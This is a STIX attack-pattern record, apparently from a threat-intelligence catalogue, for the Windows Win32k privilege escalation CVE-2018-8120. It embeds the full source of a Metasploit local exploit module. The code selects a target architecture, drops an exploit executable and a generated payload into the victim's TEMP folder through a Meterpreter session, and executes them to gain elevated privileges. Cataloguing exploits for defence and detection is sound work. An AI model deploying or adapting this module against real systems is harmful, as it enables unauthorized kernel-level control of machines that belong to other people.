{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--137a7c06-68b5-41ee-a236-aed8d5ae40df",
    "created": "2024-08-14T16:49:09.781532Z",
    "modified": "2024-08-14T16:49:09.781536Z",
    "name": "Windows SetImeInfoEx Win32k NULL Pointer Dereference",
    "description": " This module exploits elevation of privilege vulnerability that exists in Windows 7 and 2008 R2 when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.  This module is tested against windows 7 x86, windows 7 x64 and windows server 2008 R2 standard x64.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms18_8120_win32k_privesc.rb",
            "external_id": "ms18_8120_win32k_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8120"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/unamer/CVE-2018-8120"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bigric3/cve-2018-8120"
        },
        {
            "source_name": "reference",
            "url": "http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows SetImeInfoEx Win32k NULL Pointer Dereference',\n        'Description' => %q{\n          This module exploits elevation of privilege vulnerability that exists in Windows 7 and 2008 R2\n          when the Win32k component fails to properly handle objects in memory. An attacker who\n          successfully exploited this vulnerability could run arbitrary code in kernel mode. An\n          attacker could then install programs; view, change, or delete data; or create new\n          accounts with full user rights.\n\n          This module is tested against windows 7 x86, windows 7 x64 and windows server 2008 R2 standard x64.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'unamer', # Exploit PoC\n          'bigric3', # Analysis and exploit\n          'Anton Cherepanov', # Vulnerability discovery\n          'Dhiraj Mishra <dhiraj@notsosecure.com>' # Metasploit\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Targets' => [\n          [ 'Automatic', {} ],\n          [ 'Windows 7 x64', { 'Arch' => ARCH_X64 } ],\n          [ 'Windows 7 x86', { 'Arch' => ARCH_X86 } ]\n        ],\n        'Payload' => {\n          'Space' => 4096,\n          'DisableNops' => true\n        },\n        'References' => [\n          ['BID', '104034'],\n          ['CVE', '2018-8120'],\n          ['URL', 'https://github.com/unamer/CVE-2018-8120'],\n          ['URL', 'https://github.com/bigric3/cve-2018-8120'],\n          ['URL', 'http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html'],\n          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120']\n        ],\n        'DisclosureDate' => '2018-05-09',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def assign_target\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Server2008_SP2, Msf::WindowsVersion::Server2008_R2_SP1)\n      fail_with(Failure::Unknown, \"The exploit binary does not support #{version.product_name}\")\n    end\n\n    return target unless target.name == 'Automatic'\n\n    case sysinfo['Architecture']\n    when 'x64'\n      vprint_status('Targeting x64 system')\n      return targets[1]\n    when 'x86'\n      fail_with(Failure::BadConfig, 'Invalid payload architecture') if payload_instance.arch.first == ARCH_X64\n      vprint_status('Targeting x86 system')\n      return targets[2]\n    end\n  end\n\n  def write_file_to_target(fname, data)\n    tempdir = session.sys.config.getenv('TEMP')\n    file_loc = \"#{tempdir}\\\\#{fname}\"\n    vprint_warning(\"Attempting to write #{fname} to #{tempdir}\")\n    write_file(file_loc, data)\n    vprint_good(\"#{fname} written\")\n    file_loc\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    fail_with(Failure::Unknown, \"Writing #{fname} to disk was unsuccessful\")\n  end\n\n  def check_arch\n    sys_arch = assign_target\n    if sys_arch.name =~ /x86/\n      return 'CVE-2018-8120x86.exe'\n    else\n      sys_arch.name =~ /x64/\n      return 'CVE-2018-8120x64.exe'\n    end\n  end\n\n  def exploit\n    cve_fname = check_arch\n    rexe = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8120', cve_fname)\n    vprint_status(\"Reading payload from file #{rexe}\")\n    raw = File.read(rexe)\n\n    rexename = \"#{Rex::Text.rand_text_alphanumeric(10)}.exe\"\n    vprint_status(\"EXE's name is: #{rexename}\")\n    exe = generate_payload_exe\n    tempexename = \"#{Rex::Text.rand_text_alpha(6..14)}.exe\"\n\n    exe_payload = write_file_to_target(tempexename, exe)\n    vprint_status('Payload uploaded to temp folder')\n    cve_exe = write_file_to_target(rexename, raw)\n    command = \"\\\"#{cve_exe}\\\" \\\"#{exe_payload}\\\"\"\n    vprint_status(\"Location of CVE-2018-8120.exe is: #{cve_exe}\")\n    register_file_for_cleanup(exe_payload)\n\n    vprint_status(\"Executing command : #{command}\")\n    cmd_exec_get_pid(command)\n    print_good('Exploit finished, wait for privileged payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-05-09",
    "x_mitre_platforms": [
        "win'"
    ]
}